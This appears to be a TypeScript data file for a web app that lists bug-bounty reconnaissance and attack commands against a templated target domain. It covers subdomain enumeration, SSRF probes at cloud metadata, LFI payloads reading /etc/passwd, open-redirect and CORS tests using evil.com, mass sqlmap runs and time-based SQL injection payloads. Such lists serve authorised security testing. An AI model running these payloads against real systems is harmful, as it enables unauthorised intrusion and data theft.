import {
  Layers,
  Network,
  Activity,
  Link as LinkIcon,
  Bug,
  FileText,
  Eye,
  Folder,
  Globe,
  Shield,
  GitBranch,
  Server,
  ExternalLink,
  FileCode,
  Cog,
  Command,
  Star,
} from "lucide-react"

export const hueMap: Record<string, number> = {
  "subdomain": 160, "asn-ip": 270, "live-host": 350, "urls": 80,
  "nuclei": 0, "sensitive-files": 50, "params": 190, "directory": 240,
  "wordpress": 210, "cors": 160, "takeover": 30, "git": 220,
  "ssrf": 300, "open-redirect": 170, "lfi": 260, "additional": 40,
  "sql-injection": 10,
}

export interface CommandItem {
  name: string
  command: string
  description: string
}

export interface SubCategory {
  title: string
  items: CommandItem[]
}

export interface ToolSection {
  id: string
  icon: React.ElementType
  title: string
  color: string
  subs: SubCategory[]
}

export const sections: ToolSection[] = [
  {
    id: "subdomain",
    icon: Layers,
    title: "Subdomain Enumeration",
    color: "from-emerald-500 to-cyan-500",
    subs: [
      {
        title: "Automated Enumeration",
        items: [
          { name: "Subfinder", command: "subfinder -d {{domain}} -all -recursive -o subfinder.txt", description: "Fast subdomain discovery using multiple data sources" },
          { name: "Assetfinder", command: "assetfinder --subs-only {{domain}} > assetfinder.txt", description: "Find domains and subdomains related to a given domain" },
          { name: "Findomain", command: "findomain -t {{domain}} | tee findomain.txt", description: "Cross-platform subdomain enumerator" },
          { name: "Amass Passive", command: "amass enum -passive -d {{domain}} | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt", description: "Passive subdomain enumeration using OSINT" },
          { name: "Amass Active", command: "amass enum -active -d {{domain}} | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt", description: "Active subdomain enumeration with DNS resolution" },
        ],
      },
      {
        title: "Public Sources",
        items: [
          { name: "Certificate Transparency", command: "curl -s https://crt.sh/?q={{domain}}&output=json | jq -r '.[].name_value' | grep -Po '(\\w+\\.\\w+\\.\\w+)$' > crtsh.txt", description: "Extract subdomains from Certificate Transparency logs" },
          { name: "Wayback Machine", command: 'curl -s "http://web.archive.org/cdx/search/cdx?url=*.{{domain}}/*&output=text&fl=original&collapse=urlkey" | sort | sed -e \'s_https*://__\' -e "s/\\/.*//" -e \'s/:.*//\' -e \'s/^www\\.//\' | sort -u > wayback.txt', description: "Discover subdomains from archived pages" },
          { name: "VirusTotal", command: "curl -s \"https://www.virustotal.com/vtapi/v2/domain/report?apikey=[api-key]&domain={{domain}}\" | jq -r '.domain_siblings[]' > virustotal.txt", description: "Get domain siblings from VirusTotal" },
          { name: "GitHub Subdomains", command: "github-subdomains -d {{domain}} -t [github_token]", description: "Find subdomains in GitHub repositories" },
        ],
      },
      {
        title: "Subdomain Processing",
        items: [
          { name: "Merge & Deduplicate", command: "cat *.txt | sort -u > final.txt", description: "Combine all subdomain files and remove duplicates" },
          { name: "Subdomain Permutation", command: "subfinder -d {{domain}} | alterx | dnsx", description: "Generate subdomain permutations and resolve them" },
          { name: "Alterx Enrichment", command: "echo {{domain}} | alterx -enrich | dnsx", description: "Enrich domain with common patterns" },
          { name: "Alterx with Wordlist", command: "echo {{domain}} | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx", description: "Use wordlist for subdomain permutation" },
          { name: "FFUF Subdomain Bruteforce", command: "ffuf -u \"https://FUZZ.{{domain}}\" -w wordlist.txt -mc 200,301,302", description: "Brute force subdomains using FFUF" },
        ],
      },
    ],
  },
  {
    id: "asn-ip",
    icon: Network,
    title: "ASN & IP Discovery",
    color: "from-violet-500 to-purple-500",
    subs: [
      {
        title: "ASN Mapping",
        items: [
          { name: "ASN Discovery", command: "asnmap -d {{domain}} | dnsx -silent -resp-only", description: "Discover IP addresses associated with domain's ASN" },
          { name: "Amass Intel by Organization", command: "amass intel -org \"organization_name\"", description: "Discover assets by organization name" },
          { name: "Amass Intel by CIDR", command: "amass intel -active -cidr 159.69.129.82/32", description: "Discover assets within IP range" },
          { name: "Amass Intel by ASN", command: "amass intel -active -asn [asnno]", description: "Discover assets by ASN number" },
        ],
      },
      {
        title: "IP Harvesting",
        items: [
          { name: "VirusTotal IP Lookup", command: "curl -s \"https://www.virustotal.com/vtapi/v2/domain/report?domain={{domain}}&apikey=[api-key]\" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'", description: "Extract IP addresses from VirusTotal" },
          { name: "AlienVault OTX", command: "curl -s \"https://otx.alienvault.com/api/v1/indicators/hostname/{{domain}}/url_list?limit=500&page=1\" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'", description: "Get IP addresses from AlienVault OTX" },
          { name: "URLScan.io", command: "curl -s \"https://urlscan.io/api/v1/search/?q=domain:{{domain}}&size=10000\" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'", description: "Extract IP addresses from URLScan.io" },
          { name: "Shodan SSL Search", command: "shodan search Ssl.cert.subject.CN:\"{{domain}}\" 200 --fields ip_str | httpx-toolkit -sc -title -server -td", description: "Find IP addresses using Shodan SSL certificate search" },
        ],
      },
    ],
  },
  {
    id: "live-host",
    icon: Activity,
    title: "Live Host Discovery",
    color: "from-rose-500 to-pink-500",
    subs: [
      {
        title: "HTTP Probing",
        items: [
          { name: "HTTPX Basic", command: "cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt", description: "Probe for live hosts on multiple ports" },
          { name: "HTTPX with Status Codes", command: "cat subdomain.txt | httpx-toolkit -sc -title -server -td -ports 80,443,8080,8000,8888 -threads 200", description: "Probe with detailed information extraction" },
        ],
      },
      {
        title: "Visual Recon",
        items: [
          { name: "Aquatone Basic", command: "cat hosts.txt | aquatone", description: "Take screenshots of live hosts" },
          { name: "Aquatone Custom Ports", command: "cat hosts.txt | aquatone -ports 80,443,8000,8080,8443", description: "Screenshot with custom port list" },
          { name: "Aquatone Extended Ports", command: "cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888", description: "Screenshot with extended port range" },
        ],
      },
    ],
  },
  {
    id: "urls",
    icon: LinkIcon,
    title: "URL Collection & Analysis",
    color: "from-amber-500 to-orange-500",
    subs: [
      {
        title: "Active Crawling",
        items: [
          { name: "Katana", command: "katana -u livesubdomains.txt -d 2 -o urls.txt", description: "Fast web crawler for URL discovery" },
          { name: "Hakrawler", command: "cat urls.txt | hakrawler -u > urls3.txt", description: "Simple, fast web crawler" },
        ],
      },
      {
        title: "Passive Crawling",
        items: [
          { name: "GAU (Get All URLs)", command: "cat livesubdomains.txt | gau | sort -u > urls2.txt", description: "Fetch known URLs from multiple sources" },
          { name: "URLFinder", command: "urlfinder -d {{domain}} | sort -u > urls3.txt", description: "Find URLs from various sources" },
          { name: "GAU with Status Filter", command: "echo {{domain}} | gau --mc 200 | urldedupe > urls.txt", description: "Get URLs with 200 status code and deduplicate" },
        ],
      },
      {
        title: "Parameter Extraction",
        items: [
          { name: "Extract URLs with Parameters", command: "cat allurls.txt | grep '=' | urldedupe | tee output.txt", description: "Extract URLs containing parameters" },
          { name: "Parameter Pattern Matching", command: "cat allurls.txt | grep -E '\\?[^=]+=.+$' | tee output.txt", description: "Extract URLs with parameter patterns" },
          { name: "GF SQLi Pattern", command: "cat allurls.txt | gf sqli", description: "Filter URLs potentially vulnerable to SQL injection" },
        ],
      },
    ],
  },
  {
    id: "nuclei",
    icon: Bug,
    title: "Vulnerability Scanning",
    color: "from-red-500 to-rose-500",
    subs: [
      {
        title: "Nuclei Templates",
        items: [
          { name: "Nuclei Single Target", command: "nuclei -u https://{{domain}} -bs 50 -c 30", description: "Run Nuclei templates against single target" },
          { name: "Nuclei Multiple Targets", command: "nuclei -l live_domains.txt -bs 50 -c 30", description: "Run Nuclei templates against multiple targets" },
          { name: "Nuclei with Specific Severity", command: "nuclei -l live_domains.txt -s critical,high -bs 50 -c 30", description: "Run only critical and high severity templates" },
        ],
      },
    ],
  },
  {
    id: "sensitive-files",
    icon: FileText,
    title: "Sensitive File Discovery",
    color: "from-yellow-500 to-amber-500",
    subs: [
      {
        title: "File Extension Filtering",
        items: [
          { name: "Basic Sensitive Files", command: 'cat allurls.txt | grep -E "\\.xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar\\.gz|\\.tgz|\\.bak|\\.7z|\\.rar|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.gz|\\.config|\\.csv|\\.yaml|\\.md|\\.md5"', description: "Filter URLs for common sensitive file extensions" },
          { name: "Extended Sensitive Files", command: 'cat allurls.txt | grep -E "\\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"', description: "Extended regex for sensitive file discovery" },
          { name: "Google Dork for Files", command: "site:*.{{domain}} (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)", description: "Google search for sensitive files" },
        ],
      },
    ],
  },
  {
    id: "params",
    icon: Eye,
    title: "Hidden Parameter Discovery",
    color: "from-cyan-500 to-teal-500",
    subs: [
      {
        title: "Arjun Parameter Discovery",
        items: [
          { name: "Arjun Passive Discovery", command: "arjun -u https://{{domain}}/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers \"User-Agent: Mozilla/5.0\"", description: "Passive parameter discovery using Arjun" },
          { name: "Arjun Active Discovery", command: "arjun -u https://{{domain}}/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers \"User-Agent: Mozilla/5.0\"", description: "Active parameter discovery with wordlist" },
        ],
      },
    ],
  },
  {
    id: "directory",
    icon: Folder,
    title: "Directory & File Bruteforcing",
    color: "from-blue-500 to-indigo-500",
    subs: [
      {
        title: "Dirsearch",
        items: [
          { name: "Dirsearch Basic", command: "dirsearch -u https://{{domain}} --full-url --deep-recursive -r", description: "Basic directory and file discovery" },
          { name: "Dirsearch Extended", command: "dirsearch -u https://{{domain}} -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1", description: "Extended directory bruteforcing with multiple extensions" },
        ],
      },
      {
        title: "FFUF",
        items: [
          { name: "FFUF Directory Discovery", command: "ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://{{domain}}/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\" -t 10", description: "FFUF directory discovery with recursion and multiple extensions" },
        ],
      },
    ],
  },
  {
    id: "wordpress",
    icon: Globe,
    title: "WordPress Security Testing",
    color: "from-sky-500 to-blue-500",
    subs: [
      {
        title: "WPScan",
        items: [
          { name: "WPScan Full Enumeration", command: "wpscan --url https://{{domain}} --disable-tls-checks --api-token YOUR_API_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force", description: "Comprehensive WordPress security scan with aggressive plugin detection" },
        ],
      },
    ],
  },
  {
    id: "cors",
    icon: Shield,
    title: "CORS Testing",
    color: "from-green-500 to-emerald-500",
    subs: [
      {
        title: "Manual CORS Testing",
        items: [
          { name: "CORS Test with Curl", command: "curl -H \"Origin: http://evil.com\" -I https://{{domain}}/wp-json/", description: "Test CORS configuration with custom origin" },
          { name: "Detailed CORS Analysis", command: "curl -H \"Origin: http://evil.com\" -I https://{{domain}}/wp-json/ | grep -i -e \"access-control-allow-origin\" -e \"access-control-allow-methods\" -e \"access-control-allow-credentials\"", description: "Analyze CORS headers in response" },
        ],
      },
      {
        title: "Automated CORS Testing",
        items: [
          { name: "Nuclei CORS Test", command: "cat subdomains.txt | httpx-toolkit -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt", description: "Automated CORS vulnerability scanning with Nuclei" },
          { name: "Corsy Tool", command: "python3 corsy.py -i subdomains_alive.txt -t 10 --headers \"User-Agent: GoogleBot\\nCookie: SESSION=Hacked\"", description: "Advanced CORS testing with Corsy" },
          { name: "CORScanner", command: "python3 CORScanner.py -u https://{{domain}} -d -t 10", description: "Comprehensive CORS vulnerability scanner" },
        ],
      },
    ],
  },
  {
    id: "takeover",
    icon: GitBranch,
    title: "Subdomain Takeover",
    color: "from-orange-500 to-red-500",
    subs: [
      {
        title: "Subzy",
        items: [
          { name: "Subdomain Takeover Detection", command: "subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl", description: "Automated subdomain takeover detection with SSL verification" },
        ],
      },
    ],
  },
  {
    id: "git",
    icon: Server,
    title: "Git Repository Disclosure",
    color: "from-gray-500 to-slate-500",
    subs: [
      {
        title: "Git Exposure Detection",
        items: [
          { name: "Git Directory Discovery", command: "cat domains.txt | grep \"SUCCESS\" | gf urls | httpx-toolkit -sc -server -cl -path \"/.git/\" -mc 200 -location -ms \"Index of\" -probe", description: "Detect exposed .git directories and directory listings" },
        ],
      },
    ],
  },
  {
    id: "ssrf",
    icon: ExternalLink,
    title: "SSRF Testing",
    color: "from-fuchsia-500 to-pink-500",
    subs: [
      {
        title: "SSRF Parameter Discovery",
        items: [
          { name: "Find SSRF Parameters", command: "cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u", description: "Identify URLs with SSRF-prone parameters" },
          { name: "Find API/Webhook Patterns", command: "cat urls.txt | grep -i 'webhook\\|callback\\|upload\\|fetch\\|import\\|api' | sort -u", description: "Find API endpoints and webhook integrations" },
        ],
      },
      {
        title: "SSRF Testing",
        items: [
          { name: "Nuclei SSRF Scan", command: "cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/", description: "Automated SSRF vulnerability scanning" },
          { name: "Basic SSRF Test", command: "curl \"https://{{domain}}/page?url=http://127.0.0.1:80/\"", description: "Basic SSRF test to localhost" },
          { name: "Cloud Metadata SSRF", command: "curl \"https://{{domain}}/api?endpoint=http://169.254.169.254/latest/meta-data/\"", description: "Test SSRF against cloud metadata services" },
        ],
      },
    ],
  },
  {
    id: "open-redirect",
    icon: ExternalLink,
    title: "Open Redirect Testing",
    color: "from-teal-500 to-green-500",
    subs: [
      {
        title: "Parameter Discovery",
        items: [
          { name: "Find Redirect Parameters", command: "cat urls.txt | grep -Pi \"returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=\" | tee redirect_params.txt", description: "Extract URLs with redirect parameters" },
          { name: "GF Redirect Pattern", command: "cat urls.txt | gf redirect | uro | sort -u | tee redirect_params.txt", description: "Use GF patterns to find redirect parameters" },
        ],
      },
      {
        title: "Testing",
        items: [
          { name: "Basic Open Redirect Test", command: "cat redirect_params.txt | qsreplace \"https://evil.com\" | httpx-toolkit -silent -fr -mr \"evil.com\"", description: "Test redirect parameters with evil.com" },
          { name: "Comprehensive Redirect Test", command: "subfinder -d {{domain}} -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace \"https://evil.com\" | httpx-toolkit -silent -fr -mr \"evil.com\"", description: "Full pipeline for open redirect testing" },
        ],
      },
    ],
  },
  {
    id: "lfi",
    icon: FileCode,
    title: "LFI Testing",
    color: "from-indigo-500 to-violet-500",
    subs: [
      {
        title: "LFI Discovery",
        items: [
          { name: "Basic LFI Test", command: "echo \"https://{{domain}}/\" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace \"FUZZ\" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr \"root:(x|\\*|\\$[^\\:]*):0:0:\" -v", description: "LFI testing with FFUF and passwd file detection" },
          { name: "LFI with Curl", command: "gau {{domain}} | gf lfi | qsreplace \"/etc/passwd\" | xargs -I% -P 25 sh -c 'curl -s \"%\" 2>&1 | grep -q \"root:x\" && echo \"VULN! %\"'", description: "LFI testing with curl and parallel processing" },
          { name: "HTTPx LFI Test", command: "echo 'https://{{domain}}/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr \"root:(x|\\*|\\$[^\\:]*):0:0:\"", description: "LFI testing with httpx-toolkit" },
        ],
      },
    ],
  },
  {
    id: "additional",
    icon: Cog,
    title: "Additional Tools",
    color: "from-stone-500 to-zinc-500",
    subs: [
      {
        title: "Content Type Filtering",
        items: [
          { name: "HTML Content Filtering", command: "echo {{domain}} | gau | grep -Eo '(\\/[^\\/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx-toolkit -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'", description: "Filter HTML content from discovered URLs" },
          { name: "JavaScript Content Filtering", command: "echo {{domain}} | gau | grep '\\.js$' | httpx-toolkit -status-code -mc 200 -content-type | grep 'application/javascript'", description: "Filter JavaScript files from discovered URLs" },
        ],
      },
      {
        title: "Miscellaneous",
        items: [
          { name: "Extract IP Addresses", command: 'grep -oE "\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b" file.txt', description: "Extract IP addresses from text files" },
          { name: "Filter Dynamic Files", command: "cat urls.txt | grep -E \".php|.asp|.aspx|.jspx|.jsp\" | grep '=' | sort > output.txt", description: "Filter URLs for dynamic files with parameters" },
          { name: "Clean Parameters", command: "cat output.txt | sed 's/=.*/=/' > final.txt", description: "Clean parameter values for fuzzing" },
          { name: "URO Deduplication", command: "cat urls.txt | uro | sort -u > deduplicated_urls.txt", description: "Remove duplicate URLs using URO" },
          { name: "QSReplace Parameter Testing", command: "cat urls.txt | qsreplace \"FUZZ\" | sort -u > fuzz_urls.txt", description: "Replace parameter values with FUZZ for testing" },
        ],
      },
    ],
  },
  {
    id: "sql-injection",
    icon: Bug,
    title: "SQL Injection Methodology",
    color: "from-red-500 to-orange-500",
    subs: [
      {
        title: "Endpoint Discovery",
        items: [
          { name: "Single Domain SQLi Scan", command: "subfinder -d {{domain}} -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'", description: "Single domain reconnaissance for potential SQL injectable endpoints" },
          { name: "Multi-Subdomain SQLi Scan", command: "subfinder -d -l subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'", description: "Multiple subdomain reconnaissance for SQL injection testing" },
          { name: "GAU Parameter Discovery", command: "echo https://{{domain}} | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='", description: "Discover potential SQL injectable parameters using gau" },
          { name: "Katana SQLi Discovery", command: "echo https://{{domain}} | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'", description: "Alternative method for finding SQL injectable endpoints using katana" },
          { name: "Mass Ghauri Testing", command: "subfinder -d {{domain}} -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm", description: "Mass SQL injection testing using ghauri" },
          { name: "Mass SQLMap Testing", command: "subfinder -d {{domain}} -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent", description: "Comprehensive SQL injection testing using sqlmap" },
        ],
      },
      {
        title: "Header-Based Injection",
        items: [
          { name: "User-Agent XOR Payload", command: "curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://{{domain}}'", description: "Testing for time-based SQL injection via User-Agent header" },
          { name: "X-Forwarded-For XOR Payload", command: "curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://{{domain}}'", description: "Testing for time-based SQL injection via X-Forwarded-For header" },
          { name: "Referer Sleep Payload", command: "curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://{{domain}}'", description: "Testing for time-based SQL injection via Referer header" },
          { name: "User-Agent Select Sleep", command: "curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://{{domain}}'", description: "Alternative User-Agent based SQL injection test" },
          { name: "User-Agent MySQL Time-Based", command: "curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://{{domain}}'", description: "User-Agent header-based MySQL time-based injection" },
          { name: "XFF MySQL Time-Based", command: "curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://{{domain}}'", description: "X-Forwarded-For header-based MySQL time-based injection" },
          { name: "Referer MySQL Time-Based", command: "curl -H 'Referer: https://{{domain}}/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://{{domain}}'", description: "Referer header-based MySQL time-based injection" },
        ],
      },
      {
        title: "Database-Specific Payloads",
        items: [
          { name: "Oracle Time-Based", command: "SELECT dbms_pipe.receive_message(('a'),10) FROM dual", description: "Oracle database time-based injection payload" },
          { name: "MSSQL WAITFOR DELAY", command: "WAITFOR DELAY '0:0:10'", description: "Microsoft SQL Server time-based injection payload" },
          { name: "PostgreSQL pg_sleep", command: "SELECT pg_sleep(10)", description: "PostgreSQL time-based injection payload" },
          { name: "MySQL sleep", command: "SELECT sleep(10)", description: "MySQL time-based injection payload" },
        ],
      },
      {
        title: "Advanced Payloads",
        items: [
          { name: "MySQL URL Encoded XOR", command: "0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z", description: "MySQL alternative time-based payload with URL encoding" },
          { name: "PostgreSQL Complex Time-Based", command: "'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1", description: "PostgreSQL complex time-based injection payload" },
          { name: "MySQL Multi-Condition Comment", command: "if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/", description: "MySQL multi-condition time-based payload with comment bypass" },
          { name: "Combined MySQL+MSSQL", command: "1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--", description: "Combined MySQL and MSSQL time-based payload" },
          { name: "IF SLEEP Payload", command: "paramname=1'-IF(1=1,SLEEP(10),0) AND paramname='1", description: "Parameter-based MySQL time injection test" },
        ],
      },
    ],
  },
]

export const statCards = [
  { icon: Cog, label: "Tools", value: "50+" },
  { icon: Command, label: "Commands", value: "90+" },
  { icon: Star, label: "Categories", value: "17" },
  { icon: Activity, label: "Efficiency", value: "∞" },
]
